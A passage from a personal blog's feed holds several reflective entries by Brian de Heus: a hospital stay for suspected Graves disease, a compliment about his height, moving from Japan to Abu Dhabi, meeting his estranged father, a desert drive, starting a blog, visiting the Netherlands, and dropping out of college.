&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-30.jpeg&quot; alt=&quot;92751ECF-767E-428C-86C7-1C5D0ED4328C_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Wasn’t feeling too good by the end of the trip! But hey, probably caught a bug whilst traveling. It happens right.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;november&quot;&gt;November&lt;&#x2F;h2&gt;
&lt;p&gt;I notice I don’t have as much energy anymore and I scale down my working out. My resting heart rate goes up. But that’s normal
when you have a cold. Right? Right? yeah definitely. Completely normal.&lt;&#x2F;p&gt;
&lt;p&gt;Microsoft releases it’s 2024 version of Flight Simulator and in anticipation I buy nice controllers and begin playing 2020 again.
I get absolutely lost in the 2020 version, and basically forget all about the fact that I’m actually feeling like complete trash.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-31.jpeg&quot; alt=&quot;6ECB2F7A-1F6A-4EEF-9E07-D9795D2CE8DF_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We also buy our first Christmas tree in the UAE and Doja promptly claims it hers, and is ready to destroy it.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-32.jpeg&quot; alt=&quot;42599678-5B8E-45BC-A656-8B55B9B8B78B_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;december&quot;&gt;December&lt;&#x2F;h2&gt;
&lt;p&gt;I wake up and I don’t feel to good. I go to write the Famichiki Wrapped bot, when I notice my resting heart rate is above 100.
Hmm, this isn’t good. Maybe I should visit the clinic later. I stand up to get a cup of coffee. My heart rate spikes to 150.
OK, maybe I should visit the clinic now. I drive myself to the clinic and fail to get up from the chair in the waiting room. I’m feeling
a sense of anxiety that I haven’t felt since I was an angsty teenager. I’m sweating. I’m confused. This is probably not good.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-33.png&quot; alt=&quot;7FC4219F-32FE-4F19-90EA-246100BDC4DD_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The staff kindly wheelchairs me to the cardiac department where I get an ECG. The doctor says I shouldn’t worry, but they’re
going to call an ambulance to take me to a bigger hospital. My blood pressure goes wild and for the first in a long time I was
worrying about my mortality.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-34.jpeg&quot; alt=&quot;78DB6CC6-CB3C-43E7-8E67-9C9907DBDC7F_4_5005_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;At the hospital I was seen immediatley by a team of cardio doctors and endocronoligists, blood was taken, more ECGs. I was hungry.
I wasn’t allowed to eat. My heart rate continued to beat well over 100 beats a minute. I was scared. I was anxious. But I felt
like I was in good hands. 30 minutes later I was wheeled into the ICU. The what? The ICU.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-35.jpeg&quot; alt=&quot;0939262F-E59A-4707-B3EC-F666653BE491_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;My phosphate levels were dangerously low and my thyroid hormones dangerously high. A diagnosis. Wow that was quick. “Graves Disease, most likely”,
the endocrinologist told me. It’s not fun, but it’s managable. But first lets focus on getting you out of here.&lt;&#x2F;p&gt;
&lt;p&gt;Two nights I spent in the ICU. One night I spent in the recovery ward. I had friends visit and help my wife. I had to draft a will.
I had to let my parents, friends, and brother know. Dear god. I contemplated my mortality constantly. It’s dumb. They tell you it’s OK.
But the beeps and sounds and people remind you that if it wasn’t for them, I’d be in much worse situation. I wanted to go back to 8 weeks ago.
I wanted to be on the sofa watching my dumb YouTube videos on the sofa cuddling with Chinatsu. I wanted to play with Doja. I wanted the never-ending
beeping of the machines to stop.&lt;&#x2F;p&gt;
&lt;p&gt;My mind raced at a million miles an hour. I’m agitated. I get medicine. Thyroid tablets to keep my thyroid in check and beta blockers
to keep the adrenaline at bay. It helps. I start feeling better. In the last two weeks of December I visit the hospital a few times a week.
More checks. More blood. My arms starting to look like a junkie. I start to get to know the nurses and they begin to remember me.&lt;&#x2F;p&gt;
&lt;p&gt;Tomorrow, on December 31st I’m going to run tests to get more clarify on what is happening with my thyroid. Nuclear medicine. Doesn’t that sound inviting?&lt;&#x2F;p&gt;
&lt;p&gt;The doctors and nurses here often say that god is with me. I don’t know about that. I haven’t exactly lived a puritan life.
But I do know that my friends, family, and Chinatsu have been with me. Your support has been absolutely incredible. I cannot believe
how kind everyone has been and how supportive everyone has been.&lt;&#x2F;p&gt;
&lt;p&gt;Right now, I feel good. In fact, I feel great. But I can’t plan for the future at the moment. That sucks. Because I have no patience.
Things are going to be different. Which is cool. It happens. Such is life. I’m alive. I’m getting better. I’m in good hands.&lt;&#x2F;p&gt;
&lt;p&gt;But I do feel I need to live a little bit less in the fast lane. I need to take my time more. I need to enjoy my time more.
I need to reevaluate my priorities. What are my priorities? I need to determine my priorities.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-37.jpeg&quot; alt=&quot;37019AA3-9004-4F20-8D51-96A4D3DD3A47_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Every day above ground is a good day. Life is good. And I hope soon it’ll become even better.&lt;&#x2F;p&gt;
&lt;p&gt;If you’ve read up until this point, or just scrolled all the way down, I wish you nothing but the best of health for 2025.&lt;&#x2F;p&gt;
&lt;p&gt;As long as we have our health, everything else will be alright.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Brian&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Sarah and The Rest of the World.</title>
        <published>2024-10-09T00:00:00+00:00</published>
        <updated>2024-10-09T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Brian de Heus
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://brian.jp/sarah/"/>
        <id>https://brian.jp/sarah/</id>
        
        <content type="html" xml:base="https://brian.jp/sarah/">&lt;p&gt;A few years ago, while drinking with some buddies, I ran into a woman named Sarah.
I forgot her last name, but I remember that Sarah was Swiss. Probably.
If it turns out she’s not, she could easily be.
I enjoyed talking to Sarah, she was funny, smart, and had good stories to tell.
As is customary, our drinks were consumed sitting down.
Without fail when I meet new people, my height is one of the first things they will bring up.
But because we sat down, my height probably went unnoticed.
Nothing. Not a peep about my height. Until we started to mosey on to the next bar.
She said something that no one had ever said to me.&lt;&#x2F;p&gt;
&lt;p&gt;To be clear, thought I heard it all.
Questions about whether I play basketball or volleyball.
Where I buy my clothes.
What size shoes I have,
Comparisons to family members of equal or near equal height. Some &lt;em&gt;even taller&lt;&#x2F;em&gt; than me.
My resemblence to structures known for their height, like Tokyo Tower, or Big Ben.
Of course there are also the mean comments.
My cock must be small. My proportions are off. My clothes are ill-fitting.
And the one I dislike the most of all: “you’re too tall”.&lt;&#x2F;p&gt;
&lt;p&gt;But what Sarah said was different.&lt;&#x2F;p&gt;
&lt;p&gt;“Brian,” She contintued:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;“If you’re going to be tall, be tall.”&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;What an amazing thing to say to a man who is 210 centimeters tall.
She was able to boost my confidence by giving me a compliment, and at the same time asking me to better myself by not slouching.&lt;&#x2F;p&gt;
&lt;p&gt;I was walking taller that evening. And every evening after that.&lt;&#x2F;p&gt;
&lt;p&gt;Two Christmases ago, half a year after meeting her, I reached out to Sarah to let her know that her words had a profound impact on me.
She sent me back a wonderful video saying she was happy to hear from me and that she liked that her words resonated well with me.
Sarah also mentioned that she’s now in Hokkaido running her own small fashion boutique.
It was a lovely video and whenever I scroll through my photos on my phone and I happen to see the video I stop to watch it.&lt;&#x2F;p&gt;
&lt;p&gt;That night in Shibuya, Sarah could’ve said a thousand things or absolutely nothing about my height.
But she choose to do so, boost my confidence &lt;em&gt;and&lt;&#x2F;em&gt; give me advice on how to be a better version of myself.
There was no malice, no ill intent. It was fair criticism delivered in a way that will stick with me forever.
I still slouch now and then, but I’m working to to improve my posture, and I walk taller as a result.&lt;&#x2F;p&gt;
&lt;p&gt;If you’re still with me at this point, I want you to share one more thing with you.
It’s very easy to be jaded and sarcastic.
It’s very easy to point and laugh at someone’s flaws.
Every day I see people being mean to one another for no other reason but to be mean.
People are angry, people are tired, and I get it.
At the moment, shit really sucks, but at the end of the day we’re all in this together.
It’s not “us versus them”, it’s not “us versus ourselves”. It’s “us versus life”.
I’m talking about your friends, your neighbors, the people around you.
Give them a compliment.
Tell them you like something they’re doing.
Support them in their endeavors.
Offer them comfort and help them when they’re in need.
Be forgiving for their mistakes.
Be proud of their achievements.&lt;&#x2F;p&gt;
&lt;p&gt;Change starts with me.&lt;&#x2F;p&gt;
&lt;p&gt;Change starts with you.&lt;&#x2F;p&gt;
&lt;p&gt;Change starts with us.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>623 Days later.</title>
        <published>2024-01-05T00:00:00+00:00</published>
        <updated>2024-01-05T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Brian de Heus
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://brian.jp/homeless/"/>
        <id>https://brian.jp/homeless/</id>
        
        <content type="html" xml:base="https://brian.jp/homeless/">&lt;p&gt;Japan used to be what I called home.
It’s where I had my business. My friends.
Where I created a family. Then stuff happened.
I lost the family I created.
But unlike the Hollywood tropes, business was still good.
And I quickly fell in love again too.
Love doesn’t wait for anything. Especially not when you’re me.&lt;&#x2F;p&gt;
&lt;p&gt;With the events that happened came an irresistible urge to leave Japan.
It was an accumulation of feelings and circumstances,
which I initially attributed to wanting to experience life in another country,
but I now know was a desire to start fresh. A new chapter, in a new location.&lt;&#x2F;p&gt;
&lt;p&gt;For once, just as easy as it was said, it was done.
I shredded my residence card and paid my taxes one last time,
and with that I was no longer a resident in Japan.
I was a tourist. For 90 days. After that I had to go back home.&lt;&#x2F;p&gt;
&lt;p&gt;Oh fuck. Home. Where was that again? Was it the Netherlands?
Somewhere else? In the Netherlands a commercial used to run on TV.
“Home is where you drink Dauwe Egberts”. A coffee brand.
Which countries do they sell Dauwe Egberts? DE for short.
Was DE still sold in the Netherlands? And could it really be so simple?&lt;&#x2F;p&gt;
&lt;p&gt;Talking with a friend, I discovered that life in Abu Dhabi ain’t too bad,
has a favorable business climate, and on top of that food is great.
Oh, they also have Dauwe Egberts. Albeit in Nespresso capsules.
And so we moved. Life moved on. And December came.&lt;&#x2F;p&gt;
&lt;p&gt;A trip was planned back to The Netherlands.
For the first time visiting with a person I really, really love.
I wasn’t sure if it was going to be different from last time.
All I knew is that I was looking forward to showing Chinatsu where I came from.
The food I like. The places and people that helped shape who I am.&lt;&#x2F;p&gt;
&lt;p&gt;I’ll save the details of the trip for another post, but as holidays go,
at one point it was time to go back to go home. But again,
where is home? Japan no longer felt like home.
Abu Dhabi? We’ve only been living there for a few months.
Our apartment is barely furnished. To call it home would be a stretch.
And in The Netherlands we don’t even have a place to live.
I’m not registered as a resident there. Only as a citizen.&lt;&#x2F;p&gt;
&lt;p&gt;The more I thought about our situation in Abu Dhabi, the more I realized that perhaps
really all it really is, is a layover. A very long one. With an apartment. Visas.
Insurances. And a car lease. But a layover regardless. It’s not my final destination.&lt;&#x2F;p&gt;
&lt;p&gt;Where is my final destination? Do I have a final destination? Or am I destined to
hop from country to country until I am forced to begrudgingly live in the ethereal plane.
Do I call my final destination home? Or is home where I sleep.&lt;&#x2F;p&gt;
&lt;p&gt;The practical, theoretical, and philosophical meaning of home are certainly all different.
I’m writing this on an airplane with no WiFi so I can’t check.
But for me, I have discovered a stronger sense to be closer to the country where I was born.
To be closer to my family and to be closer to my old friends. Am I longing to go home?&lt;&#x2F;p&gt;
&lt;p&gt;When I left the Netherlands to fly back to Japan two years ago I left with more questions than answers.
I’ve answered a bunch of them since,
and this trip has really given me a better understanding of who and what I am,
and perhaps more importantly who I want to be.
This time I leave with answers and very few questions.
I leave with optimism and a renewed love and appreciation for the country I was born in,
and the friends and family I have there.&lt;&#x2F;p&gt;
&lt;p&gt;Indeed. The journey is just beginning.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;images&#x2F;brian-chinatsu.jpg&quot; alt=&quot;Chinatsu and me&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Hey Dad.</title>
        <published>2023-12-28T00:00:00+00:00</published>
        <updated>2023-12-28T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Brian de Heus
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://brian.jp/hey-dad/"/>
        <id>https://brian.jp/hey-dad/</id>
        
        <content type="html" xml:base="https://brian.jp/hey-dad/">&lt;p&gt;&lt;em&gt;March 8th, 2025 Update&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I’ve made some changes to the original post,
after reflecting on my own emotions at the time.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;Original Post&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I met with my dad today.
For the first time in 25 years.
Technically it’s only been 15 years.
But as I told him, that one time didn’t really count.&lt;&#x2F;p&gt;
&lt;p&gt;He lives on a small farm. It’s adorable. My mom would’ve loved it.
But they’re divorced. So probably not so much these days.
It was the first time I was able to see why my mom and dad were in love at one point.&lt;&#x2F;p&gt;
&lt;p&gt;I’ve been messaging with my dad for the past few years. He had a stroke 10 years ago.
He wobbles when he walks but is mentally very sharp. He’s funny. Kind.
He likes coffee with freshly ground beans, and his wife makes a nice spiced cake.&lt;&#x2F;p&gt;
&lt;p&gt;I last saw him when I was 8.
Most of my memories from those days are gone.
So it was nice to catch up and to be given a chance to get to know my dad.&lt;&#x2F;p&gt;
&lt;p&gt;I learned where he went to school. What he studied. How he met my mom.
How the divorce happened. And what he’d been up to.
He learned about me. How I experienced the divorce. And what I’d been up to.&lt;&#x2F;p&gt;
&lt;p&gt;We had coffee. A few slices of his wife’s fresh spiced cake.
We shared a platter of cheese.
It was weird talking to my dad.
Sharing a beer. Casually having a snack.
Just like that. After 25 years.
I had a beer with my dad. I never thought I’d experience that.&lt;&#x2F;p&gt;
&lt;p&gt;I have many questions I still want to ask.
But I had to excuse myself.
I had been there for 2 hours.
It felt like 15 minutes, but it also could’ve been an entire day.&lt;&#x2F;p&gt;
&lt;p&gt;I’m happy I got to talk to my dad again.
He was absent for a large part of my life.
During my formative years, where a dad would’ve come in handy there was a void.&lt;&#x2F;p&gt;
&lt;p&gt;And I’m happy with who I am today.
But driving home I had to pull over.
I cried. I cursed the situation of so many years ago.&lt;&#x2F;p&gt;
&lt;p&gt;It’s not my mothers fault. It’s not my fathers fault.
But I wish my father did more to reach out to me and my brother.
And I wish my mother encouraged me to talk with my father more.
I was 8. What did I know? Nothing. But again, it’s been so many
years ago. Does it really matter?
All I can really do is look forward.&lt;&#x2F;p&gt;
&lt;p&gt;Because a lot can happen in 25 years.
I know my mother has changed.
And I am sure my father has changed just as well.
But I only got to know him over the past few years, as just a dude.
An old dude. Who is my father. My dad. Do I love him?
I don’t know. But he’s still my dad.
And for now, for me, that’s all that matters.&lt;&#x2F;p&gt;
&lt;p&gt;Hey dad. It was awesome to finally meet you.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;images&#x2F;dad.jpg&quot; alt=&quot;Dad and me&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>And so this is Christmas.</title>
        <published>2023-12-24T00:00:00+00:00</published>
        <updated>2023-12-24T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Brian de Heus
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://brian.jp/and-so-this-is-christmas/"/>
        <id>https://brian.jp/and-so-this-is-christmas/</id>
        
        <content type="html" xml:base="https://brian.jp/and-so-this-is-christmas/">&lt;p&gt;It’s Christmas tomorrow.
And for the first time in 14 years I’m celebrating it in my home country of The Netherlands.
I also visited The Netherlands about 2 years ago.
But this time it feels different.
I can’t quite put my finger on it.
Perhaps the whole Christmas atmosphere amplifies whatever I’m feeling.&lt;&#x2F;p&gt;
&lt;p&gt;I honestly don’t know what to write.&lt;&#x2F;p&gt;
&lt;p&gt;Maybe I just needed an excuse to wish you all a merry Christmas.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>With my head in the clouds.</title>
        <published>2023-12-17T00:00:00+00:00</published>
        <updated>2023-12-17T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Brian de Heus
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://brian.jp/in-the-clouds/"/>
        <id>https://brian.jp/in-the-clouds/</id>
        
        <content type="html" xml:base="https://brian.jp/in-the-clouds/">&lt;p&gt;I can be quite impulsive. Not “buy a Snickers at the checkout” impulsive, (okay, that too),
but “drive to another country at 22:00pm” with a homie, “just quit college, bro”, and “move to another country”
impulsive.&lt;&#x2F;p&gt;
&lt;p&gt;When you embark on a challenge impulsively and without preparation it comes with a set of challenges.
When I drove with my homie to Luxembourg it was a time when car navigation
wasn’t common, so basically it came down to my excellent sense of direction of where Luxembourg was roughly on the map
to make it there. We did. Had a hamburger from a fast-food joint and drove back.&lt;&#x2F;p&gt;
&lt;p&gt;Quitting college meant I needed a source of income, but that too was solved simply by talking to people I knew,
people I didn’t know, and a fair share of luck. “Luck is with the fools”,
a Dutch proverb, has always seemed aptly appropriate to describe my antics and my ability to
recover from them throughout the years.&lt;&#x2F;p&gt;
&lt;p&gt;Through this impulsiveness I also found myself in the Middle East for a few months now.
If you are unfamiliar with the Middle East, it’s hot. Even in winter. And there’s sand. A lot of sand.
Through the sands lay roads, and on the roads you can drive.&lt;&#x2F;p&gt;
&lt;p&gt;One faithful day I was driving with my partner, and I had the brilliant idea of driving into the desert.
On roads, but into the desert nevertheless. Chinatsu, my partner, generally goes along with whatever I want to
do which and so it was decided we would drive into the desert, completely unprepared.&lt;&#x2F;p&gt;
&lt;p&gt;As we drove along the desert roads any marks of civilization except for the road we drove on disappeared
until we were surrounded by aforementioned sand.
I had been driving for about an hour until I realized I was thirsty.
And needless to say I didn’t bring any water.&lt;&#x2F;p&gt;
&lt;p&gt;Chinatsu was thirsty as well, so I decided to turn the car around and head back the closest petrol station.
As I attempted to make a U-turn, our car got stuck on the side of the road and needed some back-and-forth-ing
to become unstuck. No problem. Hardly an issue. But an issue large enough for me to consider what we should do
if we were to become stuck.&lt;&#x2F;p&gt;
&lt;p&gt;Stranded without water in the desert would be uncomfortable. However, being stuck on a road means that at one point
someone should drive by to help us out, be it after 1 hour, 2 hours, or a few more.
Regardless, not a life or death situation. It would be moderately uncomfortable and highly embarrassing at most.&lt;&#x2F;p&gt;
&lt;p&gt;As we drove back, mother nature struck up a beautiful scene with clouds packing overhead. Even a small cloud can
hold over 500,000 liters of water, more than enough to quench our thirst until the end of our lives.&lt;&#x2F;p&gt;
&lt;p&gt;Yet I was on the ground, and the clouds were up there high in the sky. How would I go about fetching a cloud?&lt;&#x2F;p&gt;
&lt;p&gt;My first thought was to craft a straw that’s long enough for me to suck water from the cloud. Of course, I’d never
be able to create a vacuum strong enough to pull water vapor all the way down. Plus where would I even begin to
create a straw that’s large enough to reach the clouds, &lt;em&gt;and&lt;&#x2F;em&gt; for me to be able to hold it?
&lt;img src=&quot;&#x2F;assets&#x2F;images&#x2F;dumb-idea-1.jpg&quot; alt=&quot;Dumb Idea 1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;My next idea was to create some sort of tennis racket with a piece of cloth instead of wires at the end to simply
scoop up water droplets in the fabric. Assuming I could craft something large enough, and me being strong enough,
this would seem my best option.
&lt;img src=&quot;&#x2F;assets&#x2F;images&#x2F;dumb-idea-2.jpg&quot; alt=&quot;Dumb Idea 2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Before I had time to come up with another impracticable and highly unfeasible plan, we had reached a petrol station.
One that sold water in bottles. What a novel concept.&lt;&#x2F;p&gt;
&lt;p&gt;A few hours later were home safe, and with my water net still on my mind I decided to do some googling on what the
best ways to collect water from clouds is – and although the number one option is still to wait for rain, there’s
communities and companies out there creating &lt;a href=&quot;https:&#x2F;&#x2F;www.aqualonis.com&quot;&gt;fog nets&lt;&#x2F;a&gt;. With some models being able to
collect up to 22 liters per square meter of net on a foggy day.
That’s enough drinking water for a single person for about 10 days!&lt;&#x2F;p&gt;
&lt;p&gt;And of course, we now keep a 5 liter bottle of water in our car. Just in case I’m unable to create my hypothetical
cloud catching tennis net.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>I don&#x27;t know how to blog.</title>
        <published>2023-12-07T00:00:00+00:00</published>
        <updated>2023-12-07T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Brian de Heus
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://brian.jp/i-dont-know-how-to-blog/"/>
        <id>https://brian.jp/i-dont-know-how-to-blog/</id>
        
        <content type="html" xml:base="https://brian.jp/i-dont-know-how-to-blog/">&lt;p&gt;I’ve had many blogs in the past, but I still don’t know how to blog.
After a year or so I get bored, delete my blog, move on with life, until a friend or
two begin blogging and the itch for me has to be scratched too.&lt;&#x2F;p&gt;
&lt;p&gt;And so now, probably a year or more after &lt;a href=&quot;https:&#x2F;&#x2F;famichiki.jp&#x2F;@dwvcd&quot;&gt;Derek&lt;&#x2F;a&gt; and
&lt;a href=&quot;https:&#x2F;&#x2F;famichiki.jp&#x2F;@alanb@mastodon.social&quot;&gt;Alan&lt;&#x2F;a&gt; started theirs, here I am
again ready to jump on the bandwagon.&lt;&#x2F;p&gt;
&lt;p&gt;I have a lot to write about. Or maybe I should say that I have a lot I could write about.
On how I moved away from Japan to Abu Dhabi because I felt like it. Life in a new country.
My divorce. The fight for being able to see my daughter. Yes, yes. There are many things
to write about indeed.&lt;&#x2F;p&gt;
&lt;p&gt;But I don’t know where to start. Which is problematic because as it so happens to be, getting
started is the precursor to just about anything. But maybe I’ll get better over time.&lt;&#x2F;p&gt;
&lt;p&gt;It’s nice to have a lil’ presence on the web that’s truly mine. You know, I can do anything here.
Like my own house. Could cover it in shit if I wanted, and no would be able to do anything about it.
But no one would cover their own house in shit. Probably.&lt;&#x2F;p&gt;
&lt;p&gt;I remember making my first website together with the help of a book when I was 8 or 9 years old.
Browsing through all the possible HTML tags to use.
Back when &lt;code&gt;blink&lt;&#x2F;code&gt;, &lt;code&gt;marquee&lt;&#x2F;code&gt;, and &lt;code&gt;frame&lt;&#x2F;code&gt;’s for layouts were still acceptable if not recommended.&lt;&#x2F;p&gt;
&lt;p&gt;I could make whatever I wanted. Of course, until the 60 minutes of allotted computer time each day was over.
I’d take my book and think about what I would add to my website the next day.
Of course paying for hosting my website creations was out of the question.
So the only person who could see my house covered in &lt;del&gt;shit&lt;&#x2F;del&gt; &lt;code&gt;marquee&lt;&#x2F;code&gt;-ed GIFs of ghosts
on a lemon-yellow background was myself.&lt;&#x2F;p&gt;
&lt;p&gt;My mother was quite strict about using the computer not too much.
Of course, now I’m behind one 24&#x2F;7.
Take that, mom. I’m an adult &lt;em&gt;(oh?)&lt;&#x2F;em&gt; now.&lt;&#x2F;p&gt;
&lt;p&gt;Anyway at the end of the day, I just want to create things, write words somewhere and share them with the world.&lt;&#x2F;p&gt;
&lt;p&gt;That’s it. So here we are. It’s like I’m 8 again.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>4017 days.</title>
        <published>2022-05-12T00:00:00+00:00</published>
        <updated>2022-05-12T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Brian de Heus
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://brian.jp/4017-days/"/>
        <id>https://brian.jp/4017-days/</id>
        
        <content type="html" xml:base="https://brian.jp/4017-days/">&lt;p&gt;The airplane descended for landing, through the clouds the monotone landscape
of small villages, farms, lakes and rivers slowly revealed more and more details.
At first only white cars seemed to drive on the highways. Followed by red cars.
Until eventually cyclists, of which there are many in Holland, could be made out
from the airplane windows.&lt;&#x2F;p&gt;
&lt;p&gt;We touched down a few minutes later. The screen in front of me that was
displaying flight information such as the direction of flight, the speed, also
showed the altitude. Minus 3 meters. Like many parts of The Netherlands, their
main airport is also a few meters below what we consider sea level. But sea level
doesn’t mean anything to the Dutch. Where there is ocean, they will build what is
effectively a large encasing, pump out the water, and reclaim land that was once
sea.&lt;&#x2F;p&gt;
&lt;p&gt;Together with my fellow passengers we deplaned and made our way to the
immigrations officers, the baggage belts, and eventually the arrival hall where
many of friends, loved ones, and business relations were waiting to see who
would come through the glass sliding doors next. I had to wait two hours until
my luggage arrived. During the height of covid-19 Schiphol airport laid off a large
number of it’s staff. Now it has trouble re-hiring because of reasons. And
because of those reasons it takes extra long to get your luggage.&lt;&#x2F;p&gt;
&lt;p&gt;I tried to familiarise myself with the smells and sights that I haven’t seen in 11
years. 11 years. 4017 days. That’s when I packed a single bag to build a future for
myself in a foreign country where they speak in clear syllables and write in
characters ranging from simple to utterly complex.&lt;&#x2F;p&gt;
&lt;p&gt;I flew back to the Netherlands to, in part, rediscover who I was and who I am. I
met up with friends who I’ve known for, well, decades really. People who flew
out to Japan and met me. But also my family. Who haven’t visited me in Japan
yet, and probably never will. I don’t hold it against them.&lt;&#x2F;p&gt;
&lt;p&gt;I sat down into my rental car that would be my main mode of transportation for
the next few days. The steering wheel was on the other side of what I was used
to. People also drove at the other side of the road. I got my drivers license in
Holland. And drove there for the better part of 2 years. In Japan I’ve driven a car
for 11 years. Driving in the Netherlands for me was like driving in a foreign
country.&lt;&#x2F;p&gt;
&lt;p&gt;A foreign country. Is that what my home country had become? After being away
for so long? And what is a home country? I’ve built a family in Japan. I have a
daughter. Friends. A home. A car. A business. All in Japan. The only ties I have in
Holland are my relatives, my friends, and my nationality.&lt;&#x2F;p&gt;
&lt;p&gt;I’ve come here to The Netherlands to find out who I was. And who I am. Instead
I’m leaving with more questions than answers. But it was great to see my friends
and family again. I’ve made memories that I will cherish forever. Tomorrow I’m
flying back with a new and refreshed perspective on life, what it means to be a
me, what it means to be at home, and with vows to return the country that at the
end of the day, I will forever can call my home simply because I was born there.
Next time I will visit with my family. I will show my daughter the great works of
the Dutch masters. Show my daughter the town where I grew up. And finally,
have my daughter meet her Dutch grandparents and uncle.&lt;&#x2F;p&gt;
&lt;p&gt;I hope that you, dear reader, will take the time to reach out to your loved ones
and tell them “hi”. To ask how they’re doing. Because one of the things that
transcends nationality and borders is friendship. And with enough proper care,
and some watering every 11 years, these friendships will be able to last a
lifetime.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Why I dropped out of college.</title>
        <published>2021-04-01T00:00:00+00:00</published>
        <updated>2021-04-01T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Brian de Heus
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://brian.jp/college-dropout/"/>
        <id>https://brian.jp/college-dropout/</id>
        
        <content type="html" xml:base="https://brian.jp/college-dropout/">&lt;p&gt;I am a college dropout. But not in the Alicia Keys, Mark Zuckerberg, Bill Gates, or
Kat Cole way. For starters, they all went to very respectable universities and
colleges. I went to a vocational college. Secondly, they all had a goal and dreams.
I did not. The only thing I knew is that I really, really did not like the concept of
school.&lt;&#x2F;p&gt;
&lt;p&gt;I’ve never been a good student. I went to a vocational high-school where
teachers described me as “ambitious, if only he tried”, which I think was the
description for everyone, but they also described me as lazy. And so I barely
graduated from a vocational high-school, having fucked up my exams in Dutch
and Math.&lt;&#x2F;p&gt;
&lt;p&gt;I originally wanted to go to a design academy to learn about game development.
An avid gamer and having made a few game mods and maps, it was one of the
few things I could see myself doing full-time. But, design academies cost money
and, well… we did not have any money. So I ended up at a vocational IT-oriented
college, ready to learn about computers.
Except I already learned about computers. To this day I will forever remember my
first “PC Hardware” class. Let’s call it PC Hardware 101. Happening in a computer
lab, I was told to sit behind a computer and turn it on and press the F12 key while
booting. As the teacher waited for everyone to comply he continued his lesson.
“Alright, now you can use the arrow keys on your keyboard to move the selection
up and down”. Yikes. I had been building computers for friends and family since I
was 13. The last thing I was interested in was being told how to navigate through
a bios.&lt;&#x2F;p&gt;
&lt;p&gt;Luckily a blessing appeared on the horizon. Because it was the end of 2004 and a
few months from now World of Warcraft would be released. As I dinged level 60
and fought brave battles in the world of Azeroth, my absence record dinged 80.
80%. I had missed out on 80% of all classes. You might wonder how I was able to
spend 80% of what should’ve been spend at college in Azeroth, it’s because my
parents would leave at 06:30 for work, and not be home until 16:00. This meant
that as my mother, brother, and step-dad would fuck off to work, I would flake
out on the couch in front of the TV watching the morning news until it was time
to go college.&lt;&#x2F;p&gt;
&lt;p&gt;Or, what I would do instead is either take my classic 1970s moped and drive
around the beautiful province of South-Holland and chill at the beach, or boot up
my PC and get lost in World of Warcraft, Call of Duty, or Medal of Honor.
When my mom came home one day and asked me how college was going, I knew
something was up. Because my mom could not give two shits about how college
was going. “Fine”, I said. Hoping I could bluff myself out of whatever was going
to be said next. “Your teacher called.” “-oh?”. “He said you missed 80% of your
classes and you’re going to fail this year”. What followed next was a bunch of
shouting, and honestly I can’t remember much. I was 17 at the time, and my mom
told me that going to school was mandatory until I was 18, and me not finishing
college meant I would be doomed to a life of despair and poverty. She meant
